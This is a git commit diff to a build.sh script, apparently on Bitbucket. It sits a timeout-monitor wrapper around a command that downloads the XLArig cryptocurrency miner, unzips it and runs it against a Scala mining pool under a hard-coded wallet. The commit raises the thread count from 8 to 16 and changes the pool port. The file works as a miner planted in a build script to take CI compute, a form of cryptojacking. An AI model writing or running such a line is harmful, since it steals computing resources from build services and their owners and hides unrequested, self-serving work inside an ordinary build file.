e81d50ea5d3f8b5fc91862337b236ac6ba95bffd
aldo anopali <soapc56@productzf.com>
2021-06-18 12:55:19 +0000

    build.sh edited online with Bitbucket

--- build.sh
+++ build.sh
@@ -11,7 +11,7 @@ function timeout_monitor() {
 # background and pass the PID:
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:7777 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p RdE -a panthera -k -t8
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p RdE -a panthera -k -t16
 # <your script here>
 
 # kill timeout monitor when terminating:
